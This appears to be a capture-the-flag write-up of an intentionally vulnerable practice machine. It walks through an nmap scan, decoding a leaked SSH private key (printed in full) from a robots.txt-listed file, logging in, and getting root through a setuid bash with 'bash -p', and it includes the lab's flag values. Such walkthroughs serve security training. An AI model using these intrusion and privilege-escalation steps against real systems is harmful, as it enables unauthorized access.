# Machine IP : 192.168.203.89

# Enumeration


# NMAP
-----------

```python
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.203.89
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 01:41 EDT
Nmap scan report for 192.168.203.89
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

# NMAP - ADVANCE
-------------------

```python
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p 22,80 192.168.203.89

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 01:44 EDT
Nmap scan report for 192.168.203.89
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.4.2
|_http-title: OSCP Voucher &#8211; Just another WordPress site
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
```

# FINDINGS
```python
1. 22/tcp -ssh OpenSSH 8.2p1 Ubuntu
2. 80/tcp -http Apache/2.4.41(ubuntu)
3. Website is built  in Wordpress 5.4.2
4. In IP/robots.txt---> disallow file---> IP/secret.txt
```
# Navigating to PORT-80

``
Navigating to browser
``
![proving-ground-infosec-prep](https://user-images.githubusercontent.com/98345027/184486705-1eff8062-f08d-4b3d-997f-50a086e8f784.png)

``
Since in the nmap scan, there is a secret file that is disallow
``
# Navigating to IP/secret_file.txt

```js
There is a Private key which was base64 encoded
```
```js
Steps:
1. After copying the base64 text , move on to browser and type "cyberchef"--> head over to first link and paste the base64 text into input section
2. On Recepie Section place the "From Base64" you will get the below code
```
![proving-ground-infosec-prep-base64-decode](https://user-images.githubusercontent.com/98345027/184489995-15656380-804f-45ab-9b58-b731c032df0b.png)

```python
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtHCsSzHtUF8K8tiOqECQYLrKKrCRsbvq6iIG7R9g0WPv9w+gkUWe
IzBScvglLE9flolsKdxfMQQbMVGqSADnYBTavaigQekue0bLsYk/rZ5FhOURZLTvdlJWxz
bIeyC5a5F0Dl9UYmzChe43z0Do0iQw178GJUQaqscLmEatqIiT/2FkF+AveW3hqPfbrw9v
A9QAIUA3ledqr8XEzY//Lq0+sQg/pUu0KPkY18i6vnfiYHGkyW1SgryPh5x9BGTk3eRYcN
w6mDbAjXKKCHGM+dnnGNgvAkqT+gZWz/Mpy0ekauk6NP7NCzORNrIXAYFa1rWzaEtypHwY
kCEcfWJJlZ7+fcEFa5B7gEwt/aKdFRXPQwinFliQMYMmau8PZbPiBIrxtIYXy3MHcKBIsJ
0HSKv+HbKW9kpTL5OoAkB8fHF30ujVOb6YTuc1sJKWRHIZY3qe08I2RXeExFFYu9oLug0d
tHYdJHFL7cWiNv4mRyJ9RcrhVL1V3CazNZKKwraRAAAFgH9JQL1/SUC9AAAAB3NzaC1yc2
EAAAGBALRwrEsx7VBfCvLYjqhAkGC6yiqwkbG76uoiBu0fYNFj7/cPoJFFniMwUnL4JSxP
X5aJbCncXzEEGzFRqkgA52AU2r2ooEHpLntGy7GJP62eRYTlEWS073ZSVsc2yHsguWuRdA
5fVGJswoXuN89A6NIkMNe/BiVEGqrHC5hGraiIk/9hZBfgL3lt4aj3268PbwPUACFAN5Xn
aq/FxM2P/y6tPrEIP6VLtCj5GNfIur534mBxpMltUoK8j4ecfQRk5N3kWHDcOpg2wI1yig
hxjPnZ5xjYLwJKk/oGVs/zKctHpGrpOjT+zQszkTayFwGBWta1s2hLcqR8GJAhHH1iSZWe
/n3BBWuQe4BMLf2inRUVz0MIpxZYkDGDJmrvD2Wz4gSK8bSGF8tzB3CgSLCdB0ir/h2ylv
ZKUy+TqAJAfHxxd9Lo1Tm+mE7nNbCSlkRyGWN6ntPCNkV3hMRRWLvaC7oNHbR2HSRxS+3F
ojb+JkcifUXK4VS9VdwmszWSisK2kQAAAAMBAAEAAAGBALCyzeZtJApaqGwb6ceWQkyXXr
bjZil47pkNbV70JWmnxixY31KjrDKldXgkzLJRoDfYp1Vu+sETVlW7tVcBm5MZmQO1iApD
gUMzlvFqiDNLFKUJdTj7fqyOAXDgkv8QksNmExKoBAjGnM9u8rRAyj5PNo1wAWKpCLxIY3
BhdlneNaAXDV/cKGFvW1aOMlGCeaJ0DxSAwG5Jys4Ki6kJ5EkfWo8elsUWF30wQkW9yjIP
UF5Fq6udJPnmEWApvLt62IeTvFqg+tPtGnVPleO3lvnCBBIxf8vBk8WtoJVJdJt3hO8c4j
kMtXsvLgRlve1bZUZX5MymHalN/LA1IsoC4Ykg/pMg3s9cYRRkm+GxiUU5bv9ezwM4Bmko
QPvyUcye28zwkO6tgVMZx4osrIoN9WtDUUdbdmD2UBZ2n3CZMkOV9XJxeju51kH1fs8q39
QXfxdNhBb3Yr2RjCFULDxhwDSIHzG7gfJEDaWYcOkNkIaHHgaV7kxzypYcqLrs0S7C4QAA
AMEAhdmD7Qu5trtBF3mgfcdqpZOq6+tW6hkmR0hZNX5Z6fnedUx//QY5swKAEvgNCKK8Sm
iFXlYfgH6K/5UnZngEbjMQMTdOOlkbrgpMYih+ZgyvK1LoOTyMvVgT5LMgjJGsaQ5393M2
yUEiSXer7q90N6VHYXDJhUWX2V3QMcCqptSCS1bSqvkmNvhQXMAaAS8AJw19qXWXim15Sp
WoqdjoSWEJxKeFTwUW7WOiYC2Fv5ds3cYOR8RorbmGnzdiZgxZAAAAwQDhNXKmS0oVMdDy
3fKZgTuwr8My5Hyl5jra6owj/5rJMUX6sjZEigZa96EjcevZJyGTF2uV77AQ2Rqwnbb2Gl
jdLkc0Yt9ubqSikd5f8AkZlZBsCIrvuDQZCoxZBGuD2DUWzOgKMlfxvFBNQF+LWFgtbrSP
OgB4ihdPC1+6FdSjQJ77f1bNGHmn0amoiuJjlUOOPL1cIPzt0hzERLj2qv9DUelTOUranO
cUWrPgrzVGT+QvkkjGJFX+r8tGWCAOQRUAAADBAM0cRhDowOFx50HkE+HMIJ2jQIefvwpm
Bn2FN6kw4GLZiVcqUT6aY68njLihtDpeeSzopSjyKh10bNwRS0DAILscWg6xc/R8yueAeI
Rcw85udkhNVWperg4OsiFZMpwKqcMlt8i6lVmoUBjRtBD4g5MYWRANO0Nj9VWMTbW9RLiR
kuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----

```
```js
1. Now Copy the private key to file called id_rsa
2. Running the dirb,gobuster doesn't get any useful information about the hidden directory.
```
```js
1.Now copy the id_rsa file excluding the above and below lines "-----BEGIN OPENSSH PRIVATE KEY-----" and "-----END OPENSSH PRIVATE KEY-----" 
2.Copy the base64 and Save it to "test.txt"
3.To Decode the file by the following command: cat test.txt | base64 -d
```

# Output of test.txt

```js
┌──(kali㉿kali)-[~/Desktop/Proving-ground/infosec_prep]
└─$ cat test.txt | base64 -d
openssh-key-v1nonenone�ssh-rsa��p�K1�P_
�؎�@�`��*������"�`�c����E�#0Rr�%,O_��l)�_1Q�H�`ڽ��A�.{F˱�?��E��d��vRV�6�{ �k�t_Tbl�7�@��$0׿%D▒��
                                                                                                �F�����ad�/ym���ۯo�!@7��j����.�>?�K�(�▒�Ⱥ�w�`q��mR�����}d���Xp�:�6��rq����▒�/J��V��)�G�j�:4��
                                3�6��Z�hKr�|▒�!}bI���}�k�{�L-�����X�1�&j�e�������sp�H��H�����JS/��@||qw���9��N�5���Drcz���6Ew��QX��
�v$qK�Ţ6�&G"}E��T�U�&�5��¶��I@�I@�ssh-rsa��p�K1�P_                                                                                 �
�؎�@�`��*������"�`�c����E�#0Rr�%,O_��l)�_1Q�H�`ڽ��A�.{F˱�?��E��d��vRV�6�{ �k�t_Tbl�7�@��$0׿%D▒��
                                                                                                �F�����ad�/ym���ۯo�!@7��j����.�>?�K�(�▒�Ⱥ�w�`q��mR�����}d���Xp�:�6��rq����▒�/J��V��)�G�j�:4��
                                3�6��Z�hKr�|▒�!}bI���}�k�{�L-�����X�1�&j�e�������sp�H��H�����JS/��@||qw���9��N�5���Drcz���6Ew��QX��
�v$qK�Ţ6�&G"}E��T�U�&�5��¶������m$                                                                                                 �
m^�%i��,X�R��2�ux$Q�7اUn��VU��W�����
_�(ao[V�2Q�y�t��nI����p�����fƜ�n��@�>O6�pb�HcpavY�5�
��      �IZ���}0BE��2P^E���$��`)��z؇��Z����▒uO�㷖��1���ŭ��It�w���9
�����Lsʖ����.����ك�qz;��A�~�*��M��b���!T,<a�4�1���D               �{/.e��[eFW��M��5"��� �� ��\ad�᱉E9n�^�8i(@��Q����SǊ,��
��Jh�^V�~���'fxn317N:YAy�}�j�����V�&GHY5~Y���uL�9���
Lb(~f
}�u��myJ�����Ia�ħ�O�c�`-���l��G�h����7bfE��]�1���ԂKVҪ�&6�P\�▒/'
                                        Y��5r�KJ1������;���2�|��:���#���1E��6D�Z��#q��'!�k����▒����▒X�.G4b�nn����_�     �����4
�Yk��5��
2W��PM@_�XX-n��:x�O
                   _�ԣ@��V�▒y�ѩ���c�C�<�\ ����D����CQ�S9Jڜ�Z���5FO�/�H�$U���FX A��F���q�A��� ��@���
f}�7�0�bىW*Q>�c�'����:^y,��(�*tl�K@� �Z�s�|���x�\��nvHMUj^��!Y2�
;Cc�U�M��D�����(a���▒ ��g�
����ѓ=��\▒�#��
΋~���   oscp@oscp            

```

# Findings
```js
1. Down below in the output section there is text called " oscp@oscp" 
2. This seems to be that oscp might be the user

```

# Navigating to Port-21

```js
1. Now gave the permission  to id_rsa
```
```js
┌──(kali㉿kali)-[~/Desktop/Proving-ground/infosec_prep]
└─$ chmod 600 id_rsa 
```

# SSH 

```js
1. SSH to a box
2. Command: ssh oscp@192.168.203.89 -i id_rsa
```
```js
┌──(kali㉿kali)-[~/Desktop/Proving-ground/infosec_prep]
└─$ ssh oscp@192.168.203.89 -i id_rsa 
-bash-5.0$ whoami
oscp
bash-5.0$ ls
ip  local.txt
-bash-5.0$ cat local.txt 
78ed4391d644873d2738d99b60e6835a
```

# Privilege Escalation: suid bash binary

```js
1.Running the command to get what permission user have on this box
```
```js
-bash-5.0$ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/8790/usr/lib/snapd/snap-confine
/snap/snapd/8140/usr/lib/snapd/snap-confine
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
/snap/core18/1754/bin/mount
/snap/core18/1754/bin/ping
/snap/core18/1754/bin/su
/snap/core18/1754/bin/umount
/snap/core18/1754/usr/bin/chfn
/snap/core18/1754/usr/bin/chsh
/snap/core18/1754/usr/bin/gpasswd
/snap/core18/1754/usr/bin/newgrp
/snap/core18/1754/usr/bin/passwd
/snap/core18/1754/usr/bin/sudo
/snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1754/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/bash
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su

```

# Findings

```js
-bash-5.0$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Feb 25  2020 /bin/bash
```
```js
1.Looking the  /bin/bash from the above command  and its file permission.Usually /bin/bash does not have the setuid bit set
```

```js
1. Simply we type /bin/bash -p to get root
```

```js
-bash-5.0$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# ls -la
total 36
drwxr-xr-x 4 oscp oscp 4096 Aug 13 07:27 .
drwxr-xr-x 3 root root 4096 Jul  9  2020 ..
-rw------- 1 oscp oscp    0 Aug 28  2020 .bash_history
-rw-r--r-- 1 oscp oscp  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 oscp oscp 3771 Feb 25  2020 .bashrc
drwx------ 2 oscp oscp 4096 Aug 13 07:27 .cache
-rwxr-xr-x 1 root root   88 Jul  9  2020 ip
-rw-r--r-- 1 oscp oscp   33 Aug 13 05:40 local.txt
-rw-r--r-- 1 oscp oscp  807 Feb 25  2020 .profile
drwxrwxr-x 2 oscp oscp 4096 Jul  9  2020 .ssh
-rw-r--r-- 1 oscp oscp    0 Jul  9  2020 .sudo_as_admin_successful
bash-5.0# cd /root
bash-5.0# ls -la
total 40
drwx------  4 root root 4096 Aug 13 05:40 .
drwxr-xr-x 20 root root 4096 Aug 11  2020 ..
-rw-------  1 root root    0 Aug 28  2020 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rwxr-xr-x  1 root root  248 Jul 11  2020 fix-wordpress
-rw-r--r--  1 root root   32 Aug 28  2020 flag.txt
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   33 Aug 13 05:40 proof.txt
-rw-r--r--  1 root root   66 Jul 11  2020 .selected_editor
drwxr-xr-x  3 root root 4096 Jul  9  2020 snap
drwx------  2 root root 4096 Jul  9  2020 .ssh
bash-5.0# cat proof.txt
bc919b15ba7b87281d0e24b50707fc8b
bash-5.0# 

```
